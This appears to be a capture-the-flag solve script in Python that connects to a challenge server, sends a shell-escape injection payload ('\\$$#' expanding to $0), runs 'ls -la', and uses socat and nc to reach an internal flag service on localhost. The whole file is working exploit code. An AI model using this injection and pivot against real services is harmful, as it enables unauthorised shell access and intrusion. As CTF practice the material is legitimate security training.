import socket
import time

HOST = 'challenges4.ctf.sd'
PORT = 33047

def pwn():
    print(f"Connecting to {HOST}:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        
        # Read initial banner if any (often none for nc)
        s.settimeout(1)
        try:
            print(s.recv(1024))
        except: pass

        print("Sending payload: \\$$#") 
        # \$$# expands to $0 which executes bash/sh
        s.sendall(b'\\$$#\n')
        time.sleep(1)
        
        try:
            resp = s.recv(4096).decode()
            print("Response:", resp)
        except:
            print("No immediate response (expected for shell)")

        print("Sending 'ls -la'")
        s.sendall(b'ls -la\n')
        time.sleep(0.5)
        
        try:
            print(s.recv(4096).decode())
        except:
            print("timeout waiting for ls")

        print("Found flag service on port 42158")
        s.sendall(b'socat - TCP:127.0.0.1:42158\n')
        s.sendall(b'nc 127.0.0.1 42158\n')
        time.sleep(1)
        try:
             while True:
                 d = s.recv(4096).decode()
                 if not d: break
                 print(d)
        except: pass

        # Keep open for manual interaction if needed?
        # s.interactive() equivalent is hard with raw sockets, but we might just get the flag.

if __name__ == "__main__":
    pwn()
